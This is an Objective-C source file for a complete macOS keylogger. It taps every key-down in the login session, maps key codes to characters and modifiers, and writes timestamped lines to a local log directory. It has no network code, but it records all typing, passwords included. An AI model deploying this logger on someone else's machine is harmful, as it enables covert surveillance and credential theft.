#import <Foundation/Foundation.h>
#include <ApplicationServices/ApplicationServices.h>
#import "key-tap.h"

@implementation LoggerConfig

@synthesize output;
@synthesize epoch;

@end

// Function to check if the input layout of the keyboard has switched
NSString *inputLayoutSwitched(CGKeyCode keyCode, NSString *modifierString) {
    // keyCode 179 is the key code for the "Fn" key and keyCode 49 is the key code for the "Space" key
    if ((keyCode == 179) || (keyCode == 49 && [modifierString isEqualToString:@"<Control>"])) {
        return @"Input layout has switched"; // Input layout has switched
    } else {
        return @""; // Input layout has not switched
    }
}

// Function to create time stamp
NSString *createTimeStamp(NSString *format) {
    NSDate *date = [NSDate date];
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:format];
    return [dateFormatter stringFromDate:date];
}

// Function to convert key code to character
NSString *keyCodeToCharacter(CGKeyCode keyCode, NSString *modifierString) {

    NSDictionary *keyCodeMapping = @{
        @0: @"a",  @11: @"b", @8: @"c",  @2: @"d",  @14: @"e", @3: @"f",  @5: @"g",  @4: @"h",
        @34: @"i", @38: @"j", @40: @"k", @37: @"l", @46: @"m", @45: @"n", @31: @"o", @35: @"p",
        @12: @"q", @15: @"r", @1: @"s",  @17: @"t", @32: @"u", @9: @"v",  @13: @"w", @7: @"x",
        @16: @"y", @6: @"z",
        
        // Numbers
        @18: @"1", @19: @"2", @20: @"3", @21: @"4", @23: @"5",
        @22: @"6", @26: @"7", @28: @"8", @25: @"9", @29: @"0",
        
        // Special Charaters:
        @27: @"-", @24: @"=", @33: @"[", @30: @"]", @42: @"\\",
        @43: @",", @41: @";", @47: @".", @44: @"/", @39: @"'",
        @50: @"`", 

        // Function Keys: (Compatible with Macbook Air 2020)
        @122: @"<F1>", @120: @"<F2>", @99: @"<F3>", @118: @"<F4>", @96: @"<F5>",
        @97: @"<F6>", @98: @"<F7>", @100: @"<F8>", @101: @"<F9>", @109: @"<F10>",
        @103: @"<F11>", @111: @"<F12>", @179: @"<Fn>", @160: @"<Mission Control>", 
        @177: @"<Spotlight>", @178: @"<DND>", @176: @"🎤", 

        // Control characters / whitespace
        @49: @"<Space>", @48: @"<Tab>", @36: @"<Enter>", @51: @"<Backspace>", @53: @"<Escape>",
        @117: @"<Delete>", @123: @"<Left>", @124: @"<Right>", @125: @"<Down>", @126: @"<Up>"
    };

    // Check modifierString is equal with <Shift>
    if ([modifierString isEqualToString:@"<Shift>"]) {
        NSDictionary *shiftedKeyCodeMapping = @{
            // Characters
            @0: @"A",  @11: @"B", @8: @"C",  @2: @"D",  @14: @"E", @3: @"F",  @5: @"G",  @4: @"H",
            @34: @"I", @38: @"J", @40: @"K", @37: @"L", @46: @"M", @45: @"N", @31: @"O", @35: @"P",
            @12: @"Q", @15: @"R", @1: @"S",  @17: @"T", @32: @"U", @9: @"V",  @13: @"W", @7: @"X",
            @16: @"Y", @6: @"Z",
            
            // Special Charaters:
            @27: @"_", @24: @"+", @33: @"{", @30: @"}", @42: @"|",
            @43: @"<", @41: @":", @47: @">", @44: @"?", @39: @"\"",
            @50: @"~",

            // Numbers
            @18: @"!", @19: @"@", @20: @"#", @21: @"$", @23: @"%",
            @22: @"^", @26: @"&", @28: @"*", @25: @"(", @29: @")",

            // Control characters / whitespace
            @49: @"<Space>", @48: @"<Tab>", @36: @"<Enter>", @51: @"<Backspace>", @53: @"<Escape>",
            @117: @"<Delete>", @123: @"<Left>", @124: @"<Right>", @125: @"<Down>", @126: @"<Up>"
        };
        NSString *shiftedCharacter = [shiftedKeyCodeMapping objectForKey:@(keyCode)];
        return shiftedCharacter ? shiftedCharacter : @"<?unknown?>";
    }
    
    NSString *character = [keyCodeMapping objectForKey:@(keyCode)];
    return character ? character : @"<?unknown?>";
}

/* CGEventTapCallBack function signature:
    proxy
        A proxy for the event tap. See CGEventTapProxy. This callback function may pass this proxy to other functions such as the event-posting routines.
    type
        The event type of this event. See “Event Types.”
    event
        The incoming event. This event is owned by the caller, and you do not need to release it.
    refcon
        A pointer to user-defined data. You specify this pointer when you create the event tap. Several different event taps could use the same callback function, each tap with its own user-defined data.
*/
CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    LoggerConfig *config = (__bridge LoggerConfig *)refcon;
    @autoreleasepool {
        NSMutableArray *modifiers = [NSMutableArray arrayWithCapacity:10];
        CGEventFlags flags = CGEventGetFlags(event);
        if ((flags & kCGEventFlagMaskShift) == kCGEventFlagMaskShift)
            [modifiers addObject:@"<Shift>"];
        if ((flags & kCGEventFlagMaskControl) == kCGEventFlagMaskControl)
            [modifiers addObject:@"<Control>"];
        if ((flags & kCGEventFlagMaskAlternate) == kCGEventFlagMaskAlternate)
            [modifiers addObject:@"<Option>"];
        if ((flags & kCGEventFlagMaskCommand) == kCGEventFlagMaskCommand)
            [modifiers addObject:@"<Command>"];
        if ((flags & kCGEventFlagMaskSecondaryFn) == kCGEventFlagMaskSecondaryFn)
            [modifiers addObject:@"<Fn>"];

        // Ignoring the following flags:
        //     kCGEventFlagMaskAlphaShift =    NX_ALPHASHIFTMASK,
        //     kCGEventFlagMaskHelp =          NX_HELPMASK,
        //     kCGEventFlagMaskNumericPad =    NX_NUMERICPADMASK,
        //     kCGEventFlagMaskNonCoalesced =  NX_NONCOALSESCEDMASK

        NSString *modifierString = [modifiers componentsJoinedByString:@"+"];

        // The incoming keycode. CGKeyCode is just a typedef of uint16_t, so we treat it like an int
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        // CGEventKeyboardGetUnicodeString

        // We don't need action, but if you need it, you can use the following code
        // Keypress code goes here.
        // NSString *action;
        // if (type == kCGEventKeyDown)
        //     action = @"down";
        // else if (type == kCGEventKeyUp)
        //     action = @"up";
        // else
        //     action = @"other";

        NSTimeInterval offset = [[NSDate date] timeIntervalSince1970] - config.epoch;

        // Convert the keycode to a character
        NSString *character = keyCodeToCharacter(keycode, modifierString);

        // Check if the input layout of the keyboard has switched
        NSString *inputLayoutSwitchedString = inputLayoutSwitched(keycode, modifierString);

        // Get time stamp
        NSString *timeStamp = createTimeStamp(@"YYYY-MM-dd HH:mm:ss");

        // logLine format:
        // ticks since started <TAB> key code <TAB> action <TAB> modifiers
        // so it'll look something like "13073    45    up    shift+command"
        NSString *logLine = [NSString stringWithFormat:@"%d\t%@\t%d\t%@\t%@\t%@\n",
            (int)offset, timeStamp, keycode, character, inputLayoutSwitchedString, modifierString];
        NSLog(@"> %@", logLine);
        [config.output writeData:[logLine dataUsingEncoding:NSUTF8StringEncoding]];
    }
    // We must return the event for it to be useful.
    return event;
}

int main(void) {
    // set up the file that we'll be logging into
    // NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    LoggerConfig *config = [[LoggerConfig alloc] init];
    NSUserDefaults *args = [NSUserDefaults standardUserDefaults];

    // grabs command line arguments --directory
    NSString *directory = [args stringForKey:@"directory"];
    if (!directory) {
        // default to /var/log/keylogger
        directory = @"/var/log/keylogger";
    }

    NSFileManager *fileManager = [NSFileManager defaultManager];

    // create directory if needed (since withIntermediateDirectories:YES,
    //   this shouldn't fail if the directory already exists)
    bool directory_success = [fileManager createDirectoryAtPath:directory
        withIntermediateDirectories:YES attributes:nil error:nil];
    if (!directory_success) {
        NSLog(@"Could not create directory: %@", directory);
        return 1;
    }

    // Get the current epoch timestamp
    config.epoch = [[NSDate date] timeIntervalSince1970];

    // Convert epoch timestamp to NSDate
    NSDate *date = [NSDate dateWithTimeIntervalSince1970:config.epoch];

    // Create a date formatter to specify the desired date format
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"yyMMdd-HHmmss"];

    // Replace the default date formatter's colon character with a custom character
    NSString *formattedDate = [[dateFormatter stringFromDate:date] stringByReplacingOccurrencesOfString:@":" withString:@"-"];

    // Use the formatted date as part of the filename
    NSString *filename = [NSString stringWithFormat:@"%@.log", formattedDate];

    // Construct the full file path
    NSString *filepath = [NSString pathWithComponents:@[directory, filename]];

    // Create the file
    bool create_success = [fileManager createFileAtPath:filepath contents:nil attributes:nil];
    if (!create_success) {
        NSLog(@"Could not create file: %@", filepath);
        return 1;
    }

    // now that it's been created, we can open the file
    config.output = [NSFileHandle fileHandleForWritingAtPath:filepath];
    // [config.output seekToEndOfFile];

    // Create an event tap. We are interested only in key downs.
    CGEventMask eventMask = (1 << kCGEventKeyDown);

    // If you are interested in both key up and down, you can uncomment the line below.
    // CGEventMask eventMask = (1 << kCGEventKeyDown) | (1 << kCGEventKeyUp);

    /*
    CGEventTapCreate(CGEventTapLocation tap, CGEventTapPlacement place,
        CGEventTapOptions options, CGEventMask eventsOfInterest,
        CGEventTapCallBack callback, void *refcon

    CGEventTapLocation tap:
        kCGHIDEventTap
            Specifies that an event tap is placed at the point where HID system events enter the window server.
        kCGSessionEventTap
            Specifies that an event tap is placed at the point where HID system and remote control events enter a login session.
        kCGAnnotatedSessionEventTap
            Specifies that an event tap is placed at the point where session events have been annotated to flow to an application.

    CGEventTapPlacement place:
        kCGHeadInsertEventTap
            Specifies that a new event tap should be inserted before any pre-existing event taps at the same location.
        kCGTailAppendEventTap
            Specifies that a new event tap should be inserted after any pre-existing event taps at the same location.

    CGEventTapOptions options:
       kCGEventTapOptionDefault = 0x00000000
       kCGEventTapOptionListenOnly = 0x00000001

    ...

    CGEventTapCallBack has arguments:
        (CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)

    */
    // we don't want to discard config
    // CFBridgingRetain(config);
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0,
        eventMask, myCGEventCallback, (__bridge void *)config);

    if (!eventTap) {
        NSLog(@"failed to create event tap");
        return 1;
    }
    if (!CGEventTapIsEnabled(eventTap)) {
        NSLog(@"event tap is not enabled");
        return 1;
    }

    /* Create a run loop source.

    allocator
        The allocator to use to allocate memory for the new object. Pass NULL or kCFAllocatorDefault to use the current default allocator.
    port
        The Mach port for which to create a CFRunLoopSource object.
    order
        A priority index indicating the order in which run loop sources are processed. order is currently ignored by CFMachPort run loop sources. Pass 0 for this value.
    */
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);

    /* Adds a CFRunLoopSource object to a run loop mode.
    CFRunLoopAddSource(CFRunLoopRef rl, CFRunLoopSourceRef source, CFStringRef mode);

    rl
        The run loop to modify.
    source
        The run loop source to add. The source is retained by the run loop.
    mode
        The run loop mode to which to add source. Use the constant kCFRunLoopCommonModes to add source to the set of objects monitored by all the common modes.
    */
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);

    // Enable the event tap.
    // CGEventTapEnable(eventTap, true);

    // Runs the current thread’s CFRunLoop object in its default mode indefinitely:
    CFRunLoopRun();

    return 0;
}
